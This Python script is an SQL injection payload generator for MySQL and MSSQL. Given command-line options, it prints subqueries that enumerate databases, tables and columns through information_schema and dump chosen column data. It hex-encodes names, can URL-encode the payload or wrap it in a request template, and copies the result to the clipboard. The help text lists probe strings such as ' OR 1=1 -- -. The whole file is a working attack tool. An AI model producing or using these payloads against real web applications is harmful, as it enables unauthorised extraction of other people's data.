import argparse
import urllib.parse
import pyperclip

# pyperclip.copy('The text to be copied to the clipboard.')


def str2bool(v):
    if isinstance(v, bool):
       return v
    if v.lower() in ('yes', 'true', 't', 'y', '1'):
        return True
    elif v.lower() in ('no', 'false', 'f', 'n', '0'):
        return False
    else:
        raise argparse.ArgumentTypeError('Boolean value expected.')


def ToHexString(s):
    return "0x" + "".join("{:02x}".format(ord(c)) for c in s)


def printCmd(sqli):
    if args.URLEncodePayload and not args.URLEncodeAll:
        sqli = urllib.parse.quote(sqli)

    if args.payload_wrapper:
        output = args.payload_wrapper.replace('*', sqli)
    else:
        output = sqli

    if args.URLEncodeAll:
        output = urllib.parse.quote(output)
  
    print(output)
    pyperclip.copy(output)




parser = argparse.ArgumentParser(description='')

parser.add_argument('--dbs', '-D', help='database type (mysql, mssql, etc...) # todo: oracle, sqlite...')
parser.add_argument('--database', '-d', help='database')
parser.add_argument('--table', '-t', help='table')
parser.add_argument('--columns', '-c', help='columns')

parser.add_argument('--payload_wrapper', '-p', help='Wraps payload in wrapper. Replace \'*\' in string')
parser.add_argument("--isSingleRowOutput", '-s', type=str2bool, nargs='?',
                        const=True, default=False,
                        help="wraps payload in GROUP_CONCAT()")
parser.add_argument("--URLEncodeAll", '-ea', type=str2bool, nargs='?',
                        const=True, default=False,
                        help="URL Encodes entire command")
parser.add_argument("--URLEncodePayload", '-ep', type=str2bool, nargs='?',
                        const=True, default=False,
                        help="URL Encodes Payload")

args = parser.parse_args()


if not args.dbs:
    print("Please supply database type: --dbs [mysql, mssql, oracle, sqlite, etc..]")
    print("""
        Find version:
        Database type	Query
        Microsoft, MySQL	SELECT @@version
        Oracle	SELECT * FROM v$version
        PostgreSQL	SELECT version()


Paylods to try:
' -- -
') -- -
','') -- -

' OR 1=1 -- -
    """)
    exit

# set variables: single_row_output
if args.dbs == 'mysql':
    single_row_output = "GROUP_CONCAT(*)"
elif args.dbs == 'mssql':
    single_row_output = "STRING_AGG(*, ',')"






print(single_row_output)


# databases
if (not args.database):
    print('Dump datbase')
    if args.dbs == 'mysql':
        if (args.isSingleRowOutput):
            cmd = '(SELECT GROUP_CONCAT(DISTINCT table_schema) from information_schema.tables)'
        else:
            cmd = '(SELECT DISTINCT table_schema from information_schema.tables)'
    elif args.dbs == 'mssql':
        if (args.isSingleRowOutput):
            cmd = "(SELECT DISTINCT STRING_AGG(name,',') FROM master..sysdatabases)"
        else:
            cmd = "(SELECT DISTINCT name FROM master..sysdatabases)"
    printCmd(cmd)


# list tables
if (args.database and not args.table):
    print('Dump tables')
    database_hex = ToHexString(args.database)
    if args.dbs == 'mysql':
        if (args.isSingleRowOutput):
            cmd = f'(SELECT GROUP_CONCAT(DISTINCT table_name) from information_schema.tables WHERE table_schema = {database_hex})'
        else:
            cmd = f'(SELECT table_name from information_schema.tables WHERE table_schema = {database_hex})'
    elif args.dbs == 'mssql':
        if (args.isSingleRowOutput):
            cmd = f"(SELECT DISTINCT STRING_AGG(table_name, ',') FROM {args.database}.information_schema.tables)"
        else:
            cmd = f"(SELECT DISTINCT table_name FROM {args.database}.information_schema.tables)"
    printCmd(cmd)
    

# list columns
if (args.database and args.table and not args.columns):
    print('Dump columns')
    database_hex = ToHexString(args.database)
    tables_hex = ToHexString(args.table)

    if args.dbs == 'mysql':
        if (args.isSingleRowOutput):
            cmd = f'(SELECT GROUP_CONCAT(DISTINCT column_name) from information_schema.columns WHERE table_schema = {database_hex} AND table_name = {tables_hex})'
        else:
            cmd = f'(SELECT column_name from information_schema.columns WHERE table_schema = {database_hex} AND table_name = {tables_hex})'
    elif args.dbs == 'mssql':
        if (args.isSingleRowOutput):
            cmd = f"(SELECT DISTINCT STRING_AGG(column_name, ',') FROM {args.database}.information_schema.columns WHERE table_name = '{args.table}')"
        else:
            cmd = f"(SELECT DISTINCT column_name FROM {args.database}.information_schema.columns WHERE table_name = '{args.table}')"
    
    printCmd(cmd)
    

# list data
if (args.database and args.table and args.columns):
    print('Dump data')
    columns = args.columns.split(',')

    if args.dbs == 'mysql':
        cmd = ",0x3a,".join(columns)

        if (args.isSingleRowOutput):
            cmd = f'(SELECT GROUP_CONCAT({cmd}) from {args.database}.{args.table})'
        else:
            cmd = f'(SELECT concat({cmd}) from {args.database}.{args.table})'

    elif args.dbs == 'mssql':
        cmd = "+':'+".join(columns)

        if (args.isSingleRowOutput):
            cmd = f"(SELECT STRING_AGG({cmd}, ',') FROM {args.database}..{args.table})"
        else:
            cmd = f"(SELECT STRING_AGG({cmd}, ',') FROM {args.database}..{args.table})"
    
    printCmd(cmd)
    






